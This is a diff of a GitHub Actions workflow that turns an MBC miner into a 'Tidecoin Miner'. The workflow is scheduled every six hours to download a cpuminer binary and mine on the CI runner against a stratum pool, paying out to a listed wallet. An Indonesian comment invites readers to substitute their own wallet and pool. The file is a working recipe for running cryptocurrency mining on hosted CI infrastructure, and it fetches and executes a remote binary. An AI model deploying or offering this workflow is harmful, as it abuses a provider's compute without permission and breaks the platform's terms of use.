@@ -1,17 +1,22 @@
-name: MBC Miner
+name: Tidecoin Miner
 
-on: [workflow_dispatch]
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *' # jalan tiap 6 jam
 
 jobs:
   build:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Install dependencies & start mining
+    - name: Setup & Mining TideCoin
       run: |
         sudo apt update
         sudo apt install wget -y
         wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
         tar -xvf cpuminer-opt-linux.tar.gz
         chmod +x cpuminer-sse2
-        ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:17022 -u mbc1q4kmmc3wcnl6duv50rfmae6pvs3q4wsmvz27fdl.github -t $(nproc)
+
+        # GANTI wallet dan tambang pool sesuai punya kamu
+        ./cpuminer-sse2 -a yespowertide -o stratum+tcp://stratum-eu.rplant.xyz:17059 -u TGsebW9bn1hsoJCxhbVichGmRgMsDoLNDJ.tidegithub -t 8
